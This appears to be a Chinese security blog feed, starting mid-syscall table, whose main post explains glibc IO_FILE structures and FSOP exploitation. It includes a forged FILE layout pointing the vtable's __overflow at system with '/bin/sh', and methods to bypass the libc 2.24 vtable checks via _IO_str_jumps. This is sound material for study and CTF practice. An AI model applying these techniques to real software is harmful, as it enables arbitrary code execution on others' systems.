203<br>#define __NR_sched_getaffinity 204<br>#define __NR_set_thread_area 205<br>#define __NR_io_setup 206<br>#define __NR_io_destroy 207<br>#define __NR_io_getevents 208<br>#define __NR_io_submit 209<br>#define __NR_io_cancel 210<br>#define __NR_get_thread_area 211<br>#define __NR_lookup_dcookie 212<br>#define __NR_epoll_create 213<br>#define __NR_epoll_ctl_old 214<br>#define __NR_epoll_wait_old 215<br>#define __NR_remap_file_pages 216<br>#define __NR_getdents64 217<br>#define __NR_set_tid_address 218<br>#define __NR_restart_syscall 219<br>#define __NR_semtimedop 220<br>#define __NR_fadvise64 221<br>#define __NR_timer_create 222<br>#define __NR_timer_settime 223<br>#define __NR_timer_gettime 224<br>#define __NR_timer_getoverrun 225<br>#define __NR_timer_delete 226<br>#define __NR_clock_settime 227<br>#define __NR_clock_gettime 228<br>#define __NR_clock_getres 229<br>#define __NR_clock_nanosleep 230<br>#define __NR_exit_group 231<br>#define __NR_epoll_wait 232<br>#define __NR_epoll_ctl 233<br>#define __NR_tgkill 234<br>#define __NR_utimes 235<br>#define __NR_vserver 236<br>#define __NR_mbind 237<br>#define __NR_set_mempolicy 238<br>#define __NR_get_mempolicy 239<br>#define __NR_mq_open 240<br>#define __NR_mq_unlink 241<br>#define __NR_mq_timedsend 242<br>#define __NR_mq_timedreceive 243<br>#define __NR_mq_notify 244<br>#define __NR_mq_getsetattr 245<br>#define __NR_kexec_load 246<br>#define __NR_waitid 247<br>#define __NR_add_key 248<br>#define __NR_request_key 249<br>#define __NR_keyctl 250<br>#define __NR_ioprio_set 251<br>#define __NR_ioprio_get 252<br>#define __NR_inotify_init 253<br>#define __NR_inotify_add_watch 254<br>#define __NR_inotify_rm_watch 255<br>#define __NR_migrate_pages 256<br>#define __NR_openat 257<br>#define __NR_mkdirat 258<br>#define __NR_mknodat 259<br>#define __NR_fchownat 260<br>#define __NR_futimesat 261<br>#define __NR_newfstatat 262<br>#define __NR_unlinkat 263<br>#define __NR_renameat 264<br>#define __NR_linkat 265<br>#define __NR_symlinkat 266<br>#define __NR_readlinkat 267<br>#define __NR_fchmodat 268<br>#define __NR_faccessat 269<br>#define __NR_pselect6 270<br>#define __NR_ppoll 271<br>#define __NR_unshare 272<br>#define __NR_set_robust_list 273<br>#define __NR_get_robust_list 274<br>#define __NR_splice 275<br>#define __NR_tee 276<br>#define __NR_sync_file_range 277<br>#define __NR_vmsplice 278<br>#define __NR_move_pages 279<br>#define __NR_utimensat 280<br>#define __NR_epoll_pwait 281<br>#define __NR_signalfd 282<br>#define __NR_timerfd_create 283<br>#define __NR_eventfd 284<br>#define __NR_fallocate 285<br>#define __NR_timerfd_settime 286<br>#define __NR_timerfd_gettime 287<br>#define __NR_accept4 288<br>#define __NR_signalfd4 289<br>#define __NR_eventfd2 290<br>#define __NR_epoll_create1 291<br>#define __NR_dup3 292<br>#define __NR_pipe2 293<br>#define __NR_inotify_init1 294<br>#define __NR_preadv 295<br>#define __NR_pwritev 296<br>#define __NR_rt_tgsigqueueinfo 297<br>#define __NR_perf_event_open 298<br>#define __NR_recvmmsg 299<br>#define __NR_fanotify_init 300<br>#define __NR_fanotify_mark 301<br>#define __NR_prlimit64 302<br>#define __NR_name_to_handle_at 303<br>#define __NR_open_by_handle_at 304<br>#define __NR_clock_adjtime 305<br>#define __NR_syncfs 306<br>#define __NR_sendmmsg 307<br>#define __NR_setns 308<br>#define __NR_getcpu 309<br>#define __NR_process_vm_readv 310<br>#define __NR_process_vm_writev 311<br>#define __NR_kcmp 312<br>#define __NR_finit_module 313<br>#define __NR_sched_setattr 314<br>#define __NR_sched_getattr 315<br>#define __NR_renameat2 316<br>#define __NR_seccomp 317<br>#define __NR_getrandom 318<br>#define __NR_memfd_create 319<br>#define __NR_kexec_file_load 320<br>#define __NR_bpf 321<br>#define __NR_execveat 322<br>#define __NR_userfaultfd 323<br>#define __NR_membarrier 324<br>#define __NR_mlock2 325<br>#define __NR_copy_file_range 326<br>#define __NR_preadv2 327<br>#define __NR_pwritev2 328<br><br>#endif /* _ASM_X86_UNISTD_64_H */<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>syscall</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IO_FILE相关笔记</title>
    <link href="/2025/04/20/IO_FILE%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/04/20/IO_FILE%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="IO-FILE相关笔记"><a href="#IO-FILE相关笔记" class="headerlink" title="IO_FILE相关笔记"></a>IO_FILE相关笔记</h1><hr><h2 id="一、IO-FILE相关结构"><a href="#一、IO-FILE相关结构" class="headerlink" title="一、IO_FILE相关结构"></a>一、IO_FILE相关结构</h2><p><code>_IO_FILE_plus</code>、<code>_IO_FILE</code>、<code>_IO_jump_t</code>结构体的定义分别为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br>--------------------------------------------------------------------------------------------<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;        <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;    <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;    <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;    <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base;    <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;    <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;    <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;    <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br>  <span class="hljs-comment">/*  char* _save_gtr;  char* _save_egptr; */</span><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;   <br>--------------------------------------------------------------------------------------------<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>    get_column;<br>    set_column;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><br><br></code></pre></td></tr></table></figure><p>进程中<code>FILE</code>结构通过<code>_chain</code>域构成一个链表，链表头部为<code>_IO_list_all</code>全局变量，默认情况下依次链接了<code>stderr</code>,<code>stdout</code>,<code>stdin</code>三个文件流，并将新建的流插入到头部，<code>vtable</code>虚表为<code>_IO_file_jumps</code>。</p><p><img src="/../images/IO_FILE/1.png" alt="image-20250420202923575"></p><p>此外，还有<code>_IO_wide_data</code>结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span></span><br><span class="hljs-class">&#123;</span><br>      <span class="hljs-type">wchar_t</span> *_IO_read_ptr;   <br>      <span class="hljs-type">wchar_t</span> *_IO_read_end;<br>      <span class="hljs-type">wchar_t</span> *_IO_read_base;<br>      <span class="hljs-type">wchar_t</span> *_IO_write_base;<br>      <span class="hljs-type">wchar_t</span> *_IO_write_ptr;<br>      <span class="hljs-type">wchar_t</span> *_IO_write_end;   <br>      <span class="hljs-type">wchar_t</span> *_IO_buf_base;   <br>      <span class="hljs-type">wchar_t</span> *_IO_buf_end;   <br>      [...]<br>      <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *_<span class="hljs-title">wide_vtable</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>宏的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC 0xFBAD0000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_UNBUFFERED 2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_READS 4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_EOF_SEEN 0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_ERR_SEEN 0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_LINKED 0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IN_BACKUP 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_LINE_BUF 0x200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_TIED_PUT_GET 0x400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_APPENDING 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_FILEBUF 0x2000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_BAD_SEEN 0x4000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_LOCK 0x8000</span><br></code></pre></td></tr></table></figure><h2 id="二、IO-FILE-attack-之-FSOP-libc-2-23-2-24"><a href="#二、IO-FILE-attack-之-FSOP-libc-2-23-2-24" class="headerlink" title="二、IO_FILE attack 之 FSOP (libc 2.23 &amp; 2.24)"></a>二、IO_FILE attack 之 FSOP (libc 2.23 &amp; 2.24)</h2><p>主要原理为劫持<code>vtable</code>与<code>_chain</code>，伪造<code>IO_FILE</code>，主要利用方式为调用**IO_flush_all_lockp()**函数触发。<br><code>IO_flush_all_lockp()</code>函数将在以下三种情况下被调用：</p><ol><li><code>libc</code>检测到<strong>内存错误</strong>，从而执行<code>abort</code>函数时（在<code>glibc-2.26</code>删除）。</li><li>程序执行<code>exit</code>函数时。</li><li>程序从<code>main</code>函数返回时。</li></ol><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> _IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *<span class="hljs-title">fp</span>;</span><br>  <span class="hljs-type">int</span> last_stamp;<br> <br>  fp = (_IO_FILE *) _IO_list_all;<br>  <span class="hljs-keyword">while</span> (fp != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        ...<br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>       || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>           &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>       )<br>      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)   <span class="hljs-comment">//如果输出缓冲区有数据，刷新输出缓冲区</span><br>    result = EOF;<br> <br> <br>    fp = fp-&gt;_chain; <span class="hljs-comment">//遍历链表</span><br>    &#125;<br>    [...]<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/../images/IO_FILE/2.png" alt="image-20250420203533418"></p><p>当满足以下条件，就会执行_IO_OVERFLOW()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode = <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><p>所以在2.23的时候就可以这样构造来打FSOP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C">._chain =&gt; chunk_addr<br>chunk_addr<br>&#123;<br>  file = &#123;<br>    _flags = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>, <span class="hljs-comment">//对应此结构体首地址(fp)</span><br>    _IO_read_ptr = <span class="hljs-number">0x0</span>,<br>    _IO_read_end = <span class="hljs-number">0x0</span>,<br>    _IO_read_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x1</span>,<br>      ...<br>      _mode = <span class="hljs-number">0x0</span>, <span class="hljs-comment">//一般不用特意设置</span><br>      _unused2 = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">19</span> times&gt;<br>  &#125;,<br>  vtable = heap_addr<br>&#125;<br>heap_addr<br>&#123;<br>  __dummy = <span class="hljs-number">0x0</span>,<br>  __dummy2 = <span class="hljs-number">0x0</span>,<br>  __finish = <span class="hljs-number">0x0</span>,<br>  __overflow = system_addr,<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>这时候chunk_addr里面的 <strong>_IO_write_ptr</strong> &gt; <strong>_IO_write_base</strong>且<strong>base&#x3D;0</strong>，就会触发chunk_addr的 <strong>_IO_OVERFLOW</strong>函数，执行 <strong>_IO_OVERFLOW(fp)</strong>，也就是<strong>system(‘&#x2F;bin&#x2F;sh\x00’)</strong></p><p>而<code>libc-2.24</code>加入了对虚表的检查<strong>IO_validate_vtable()<strong>与</strong>IO_vtable_check()</strong>,若无法通过检查，则会报错：<strong>Fatal error: glibc detected an invalid stdio handle。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span><br><span class="hljs-meta">  (IO_validate_vtable                                                   \</span><br><span class="hljs-meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)   \</span><br><span class="hljs-meta">                 + (THIS)-&gt;_vtable_offset)))</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t * <span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ptr = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="hljs-comment">//检查vtable指针是否在glibc的vtable段中。</span><br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>glibc</code>中有一段完整的内存存放着各个<code>vtable</code>，其中<code>__start___libc_IO_vtables</code>指向第一个<code>vtable</code>地址<code>_IO_helper_jumps</code>，而<code>__stop___libc_IO_vtables</code>指向最后一个<code>vtable_IO_str_chk_jumps</code>结束的地址。<br>若指针不在<code>glibc</code>的<code>vtable</code>段，会调用<code>_IO_vtable_check()</code>做进一步检查，以判断程序是否使用了外部合法的<code>vtable</code>（重构或是动态链接库中的<code>vtable</code>），如果不是则报错。<br>具体源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> attribute_hidden _IO_vtable_check (<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  <span class="hljs-type">void</span> (*flag) (<span class="hljs-type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (flag);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (flag == &amp;_IO_vtable_check) <span class="hljs-comment">//检查是否是外部重构的vtable</span><br>    <span class="hljs-keyword">return</span>;<br> <br>  &#123;<br>    Dl_info di;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>    <span class="hljs-keyword">if</span> (_dl_open_hook != <span class="hljs-literal">NULL</span><br>        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span><br>            &amp;&amp; l-&gt;l_ns != LM_ID_BASE)) <span class="hljs-comment">//检查是否是动态链接库中的vtable</span><br>      <span class="hljs-keyword">return</span>;<br>  &#125;<br> <br>...<br> <br>  __libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>因此，最好的办法是：我们伪造的<code>vtable</code>在<code>glibc</code>的<code>vtable</code>段中，从而得以绕过该检查。<br>目前来说，有四种思路：利用<code>_IO_str_jumps</code>中<code>_IO_str_overflow()</code>函数，利用<code>_IO_str_jumps</code>中<code>_IO_str_finish()</code>函数与利用<code>_IO_wstr_jumps</code>中对应的这两种函数，先来介绍最为方便的：利用<code>_IO_str_jumps</code>中<code>_IO_str_finish()</code>函数的手段。<br><code>_IO_str_jumps</code>的结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_str_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>    JUMP_INIT_DUMMY,<br>    JUMP_INIT(finish, _IO_str_finish),<br>    JUMP_INIT(overflow, _IO_str_overflow),<br>    JUMP_INIT(underflow, _IO_str_underflow),<br>    JUMP_INIT(uflow, _IO_default_uflow),<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>其中，<code>_IO_str_finish</code>源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> _IO_str_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); <span class="hljs-comment">//执行函数</span><br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中相关的<code>_IO_str_fields</code>结构体与<code>_IO_strfile_</code>结构体的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_str_fields</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_alloc_type _allocate_buffer;<br>  _IO_free_type _free_buffer;<br>&#125;;<br> <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_strfile_</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_streambuf</span> _<span class="hljs-title">sbf</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_str_fields</span> _<span class="hljs-title">s</span>;</span><br>&#125; 